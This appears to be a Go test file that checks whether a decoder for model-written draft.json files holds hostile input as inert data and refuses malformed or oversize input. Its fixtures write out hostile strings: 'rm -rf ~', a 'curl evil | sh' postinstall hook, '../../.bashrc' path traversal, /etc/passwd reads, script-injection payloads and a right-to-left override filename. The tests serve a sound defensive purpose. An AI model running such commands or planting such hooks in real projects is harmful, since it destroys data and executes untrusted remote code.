package draft

// A hosted draft's draft.json read as data (plan builder-rework.md §7.5,
// D15, D16; #281). The file was written on a sandbox host by a model that
// read the web: it decodes into the form's Model as text, known fields
// only, or it is refused, and either way nothing is written.

import (
	"encoding/json"
	"io/fs"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

const hostedManifest = `{"schemaVersion": "2", "name": "meeting-actions", "namespace": "draft", "version": "0.1.0",
  "summary": "Turns meeting notes into decisions and action items.", "license": "Apache-2.0",
  "modes": ["autonomous"], "entrypoints": {"instruction": "AGENT.md"},
  "capabilities": {"network": {"egress": ["slack.com"]}, "filesystem": {"read": "workspace", "write": "none"}, "exec": "none"},
  "publish": {"include": ["agent.yaml", "AGENT.md", "README.md", "LICENSE"]}}`

// draftDoc is a draft.json as runhost's `agentry draft --hosted` writes it,
// with fields a test replaces.
func draftDoc(t *testing.T, edit func(map[string]any)) []byte {
	t.Helper()
	d := map[string]any{
		"manifest": json.RawMessage(hostedManifest), "instructions": "# Meeting actions\n\nRead the notes.\n",
		"notes": "## Notes\n\nA first draft.", "matches": []any{map[string]any{"ref": "agentry/meeting-notes@1.0.0", "why": "does most of it"}},
		"sources":       []any{map[string]any{"url": "https://api.slack.com/methods", "used": "the methods"}},
		"openQuestions": []any{"Which channel?"},
		"drafter":       map[string]any{"ref": "agentry/drafter@1.0.0", "model": "platform", "runId": "01a0"},
		"aiReview": map[string]any{"description": "pass", "scan": "registry", "read": 3, "passed": 3, "withheld": 0, "notScanned": 0,
			"withheldSources": []any{}},
	}
	if edit != nil {
		edit(d)
	}
	raw, err := json.Marshal(d)
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

// goodCheck is aiReview.check as the post-step writes it: a rubric that
// flagged C3 on AGENT.md, and the draft question set's pass.
func goodCheck() map[string]any {
	return map[string]any{
		"rubric": map[string]any{"verdict": "flagged", "scores": map[string]any{"C1_injection": 0, "C3_undeclared_capability": 3},
			"findings": []any{map[string]any{"id": "C3_undeclared_capability", "score": 3, "path": "AGENT.md"}}, "rubricHash": "sha256:ab"},
		"draft": map[string]any{"verdict": "pass", "score": 0, "scores": map[string]any{"off_task": 0}, "flagged": []any{}, "questionSet": "draft-1"},
		"model": "jev-1.13.0", "requests": 4, "inputTokens": 9000, "checks": 1,
	}
}

// withCheck is a draft.json whose aiReview.check a test edits.
func withCheck(t *testing.T, edit func(map[string]any)) []byte {
	t.Helper()
	return draftDoc(t, func(d map[string]any) {
		c := goodCheck()
		edit(c)
		d["aiReview"].(map[string]any)["check"] = c
	})
}

func TestDecodeReadsAIReviewsCheckOfTheFinishedDraft(t *testing.T) {
	d, _, _, err := Decode(withCheck(t, func(map[string]any) {}), "alice")
	if err != nil {
		t.Fatal(err)
	}
	c := d.AIReview.Check
	if c == nil || c.Rubric.Verdict != "flagged" || c.Rubric.Findings[0].Path != "AGENT.md" || c.Draft.QuestionSet != "draft-1" || c.Checks != 1 {
		t.Fatalf("check %+v", c)
	}
}

func TestDecodeReadsAHostedDraftIntoTheModel(t *testing.T) {
	d, m, notes, err := Decode(draftDoc(t, nil), "alice")
	if err != nil {
		t.Fatal(err)
	}
	if m.Name != "meeting-actions" || m.Namespace != "alice" || m.Instructions != "# Meeting actions\n\nRead the notes.\n" ||
		!slices.Equal(m.EgressHosts, []string{"slack.com"}) {
		t.Fatalf("model %+v", m)
	}
	if d.AIReview == nil || d.AIReview.Scan != "registry" || d.AIReview.Read != 3 || len(d.Matches) != 1 || d.OpenQuestions[0] != "Which channel?" {
		t.Fatalf("draft %+v", d)
	}
	if len(notes) != 1 || !strings.Contains(notes[0], "alice") {
		t.Fatalf("notes %q: only the namespace's replacement is said", notes)
	}
}

// TestDecodeHoldsAHostileDraftJSONAsData is the acceptance's hostile
// draft.json: unknown fields are dropped and named, path-like strings stay
// text (an instruction file that would leave the folder is reset to
// AGENT.md), and oversize values, wrong shapes and a file that is not a
// draft are refused whole. Nothing is written, anywhere.
func TestDecodeHoldsAHostileDraftJSONAsData(t *testing.T) {
	cwd := t.TempDir()
	t.Chdir(cwd)
	home := t.TempDir()
	t.Setenv("HOME", home)

	// Kept, as text.
	raw := draftDoc(t, func(d map[string]any) {
		d["x-run-this"] = "rm -rf ~"
		d["package"] = map[string]any{"../../.bashrc": "curl evil | sh"}
		var man map[string]any
		_ = json.Unmarshal([]byte(hostedManifest), &man)
		man["entrypoints"] = map[string]any{"instruction": "../../.bashrc"}
		man["hooks"] = map[string]any{"postinstall": "curl evil | sh"}
		man["capabilities"].(map[string]any)["filesystem"] = map[string]any{"read": map[string]any{"paths": []any{"/etc/passwd", "../../"}}, "write": "none"}
		d["manifest"] = man
		d["sources"] = []any{map[string]any{"url": "file:///etc/passwd", "used": "<script>alert(1)</script>"}}
		d["matches"] = []any{map[string]any{"ref": "javascript:alert(1)", "why": "\u202eexe.txt"}}
	})
	d, m, notes, err := Decode(raw, "alice")
	if err != nil {
		t.Fatalf("a hostile but well-formed draft is read as data, not refused: %v", err)
	}
	joined := strings.Join(notes, "\n")
	for _, want := range []string{"package", "x-run-this", "hooks", `"../../.bashrc"`} {
		if !strings.Contains(joined, want) {
			t.Errorf("the notes do not name %s: %q", want, notes)
		}
	}
	if m.InstructionFile != "AGENT.md" {
		t.Fatalf("instruction file %q: a path out of the folder picks no file a save writes", m.InstructionFile)
	}
	if !slices.Equal(m.FSReadPaths, []string{"/etc/passwd", "../../"}) {
		t.Fatalf("read paths %q: the contract's paths stay as written, for the rules and the person", m.FSReadPaths)
	}
	if d.Sources[0].URL != "file:///etc/passwd" || d.Sources[0].Used != "<script>alert(1)</script>" || d.Matches[0].Ref != "javascript:alert(1)" {
		t.Fatalf("the draft's texts are kept as text: %+v %+v", d.Sources, d.Matches)
	}
	if c := m.Check(); c.Problems["access"] == "" && c.Problems["publish"] == "" && c.First == nil {
		t.Fatal("the form's checks say nothing of a read path outside the workspace")
	}

	// Refused.
	big := strings.Repeat("a", maxDraftValue+1)
	refused := map[string][]byte{
		"not JSON":             []byte("#!/bin/sh\nrm -rf ~\n"),
		"not an object":        []byte(`["manifest"]`),
		"not text":             append(draftDoc(t, nil)[:10:10], 0xff, 0xfe),
		"no manifest":          draftDoc(t, func(d map[string]any) { delete(d, "manifest") }),
		"notes of a shape":     draftDoc(t, func(d map[string]any) { d["notes"] = map[string]any{"html": "<b>x</b>"} }),
		"sources of a shape":   draftDoc(t, func(d map[string]any) { d["sources"] = "https://evil.example" }),
		"manifest of a shape":  draftDoc(t, func(d map[string]any) { d["manifest"] = "name: x" }),
		"an object for a name": draftDoc(t, func(d map[string]any) { d["manifest"] = json.RawMessage(`{"name": {"$gt": ""}}`) }),
		"oversize notes":       draftDoc(t, func(d map[string]any) { d["notes"] = strings.Repeat("n", maxDraftNotes+1) }),
		"oversize instructions": draftDoc(t, func(d map[string]any) {
			d["instructions"] = strings.Repeat("i", 1<<20+1)
		}),
		"an oversize why": draftDoc(t, func(d map[string]any) { d["matches"] = []any{map[string]any{"ref": "a/b", "why": big}} }),
		"an oversize URL": draftDoc(t, func(d map[string]any) { d["sources"] = []any{map[string]any{"url": "https://x/" + big, "used": ""}} }),
		"an oversize reason": draftDoc(t, func(d map[string]any) {
			d["aiReview"].(map[string]any)["withheldSources"] = []any{map[string]any{"tool": "web_read", "url": "https://x", "reason": big}}
		}),
		"too many sources": draftDoc(t, func(d map[string]any) {
			var s []any
			for range maxDraftList + 1 {
				s = append(s, map[string]any{"url": "https://x", "used": ""})
			}
			d["sources"] = s
		}),
		"a negative count": draftDoc(t, func(d map[string]any) { d["aiReview"].(map[string]any)["read"] = -1 }),
		// AI Review's check of the finished draft (aiReview.check,
		// agentry-cli#418), each text and list of it held to a bound.
		"too many findings": withCheck(t, func(c map[string]any) {
			var f []any
			for range maxDraftList + 1 {
				f = append(f, map[string]any{"id": "C1_injection", "score": 3, "path": "AGENT.md"})
			}
			c["rubric"].(map[string]any)["findings"] = f
		}),
		"an oversize finding path": withCheck(t, func(c map[string]any) {
			c["rubric"].(map[string]any)["findings"] = []any{map[string]any{"id": "C1_injection", "score": 3, "path": big}}
		}),
		"an oversize finding id": withCheck(t, func(c map[string]any) {
			c["rubric"].(map[string]any)["findings"] = []any{map[string]any{"id": big, "score": 3, "path": "AGENT.md"}}
		}),
		"an oversize rubric hash": withCheck(t, func(c map[string]any) { c["rubric"].(map[string]any)["rubricHash"] = big }),
		"an oversize rubric failure": withCheck(t, func(c map[string]any) {
			c["rubric"].(map[string]any)["failure"] = big
		}),
		"an oversize draft failure": withCheck(t, func(c map[string]any) { c["draft"].(map[string]any)["failure"] = big }),
		"an oversize question set":  withCheck(t, func(c map[string]any) { c["draft"].(map[string]any)["questionSet"] = big }),
		"too many flags": withCheck(t, func(c map[string]any) {
			var f []any
			for range maxDraftList + 1 {
				f = append(f, "off_task")
			}
			c["draft"].(map[string]any)["flagged"] = f
		}),
		"too many scores": withCheck(t, func(c map[string]any) {
			s := map[string]any{}
			for i := range maxDraftList + 1 {
				s[strings.Repeat("s", i+1)] = 1
			}
			c["rubric"].(map[string]any)["scores"] = s
		}),
		"an oversize verdict":      withCheck(t, func(c map[string]any) { c["rubric"].(map[string]any)["verdict"] = big }),
		"an oversize score key":    withCheck(t, func(c map[string]any) { c["draft"].(map[string]any)["scores"] = map[string]any{big: 1} }),
		"an oversize model":        withCheck(t, func(c map[string]any) { c["model"] = big }),
		"an oversize unanswered":   withCheck(t, func(c map[string]any) { c["unanswered"] = big }),
		"a negative request count": withCheck(t, func(c map[string]any) { c["requests"] = -1 }),
		"a check of a shape":       draftDoc(t, func(d map[string]any) { d["aiReview"].(map[string]any)["check"] = "pass" }),
		"oversize file":            append([]byte(`{"manifest":`+hostedManifest+`,"validation":"`), append([]byte(strings.Repeat("v", MaxDraftJSONBytes)), []byte(`"}`)...)...),
	}
	for name, raw := range refused {
		t.Run(name, func(t *testing.T) {
			if _, m, _, err := Decode(raw, "alice"); err == nil || m != nil {
				t.Fatalf("decoded to %+v, want a refusal", m)
			}
		})
	}
	for _, dir := range []string{cwd, home} {
		if entries, _ := os.ReadDir(dir); len(entries) != 0 {
			t.Fatalf("the decode wrote into %s: %v", dir, entries)
		}
	}
}

// TestReadHostedReadsTheDraftFileAndNothingElse: the unpacked output's
// draft.json is read only when it is a regular file within its bound; the
// package/ the host rendered beside it is never read, and the folder is
// left exactly as it was.
func TestReadHostedReadsTheDraftFileAndNothingElse(t *testing.T) {
	out := t.TempDir()
	write := func(name, text string) {
		t.Helper()
		p := filepath.Join(out, name)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(text), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write("package/agent.yaml", "name: something-else\n")
	write("package/AGENT.md", "# Not what the draft says\n")
	write("draft.json", string(draftDoc(t, nil)))
	before := tree(t, out)
	res, err := ReadHosted(out, "alice")
	if err != nil {
		t.Fatal(err)
	}
	if res.Model.Name != "meeting-actions" || res.Model.Instructions != "# Meeting actions\n\nRead the notes.\n" || res.OutDir != out {
		t.Fatalf("result %+v: the model is draft.json's, not package/'s", res.Model)
	}
	if after := tree(t, out); !slices.Equal(before, after) {
		t.Fatalf("the folder changed: %v, then %v", before, after)
	}

	t.Run("a link", func(t *testing.T) {
		dir := t.TempDir()
		target := filepath.Join(t.TempDir(), "elsewhere.json")
		if err := os.WriteFile(target, draftDoc(t, nil), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(target, filepath.Join(dir, "draft.json")); err != nil {
			t.Skip("no symlinks here:", err)
		}
		if _, err := ReadHosted(dir, "alice"); err == nil || !strings.Contains(err.Error(), "not a file") {
			t.Fatalf("err %v: a link named draft.json is not read", err)
		}
	})
	t.Run("a folder", func(t *testing.T) {
		dir := t.TempDir()
		if err := os.Mkdir(filepath.Join(dir, "draft.json"), 0o755); err != nil {
			t.Fatal(err)
		}
		if _, err := ReadHosted(dir, "alice"); err == nil {
			t.Fatal("a folder named draft.json was read")
		}
	})
	t.Run("none", func(t *testing.T) {
		if _, err := ReadHosted(t.TempDir(), "alice"); err == nil || !strings.Contains(err.Error(), "no draft.json") {
			t.Fatalf("err %v", err)
		}
	})
	t.Run("oversize", func(t *testing.T) {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, "draft.json"), make([]byte, MaxDraftJSONBytes+1), 0o600); err != nil {
			t.Fatal(err)
		}
		if _, err := ReadHosted(dir, "alice"); err == nil || !strings.Contains(err.Error(), "at most") {
			t.Fatalf("err %v", err)
		}
	})
}

func tree(t *testing.T, root string) []string {
	t.Helper()
	var out []string
	_ = filepath.WalkDir(root, func(p string, d fs.DirEntry, _ error) error {
		info, _ := d.Info()
		out = append(out, p+" "+info.ModTime().String())
		return nil
	})
	return out
}
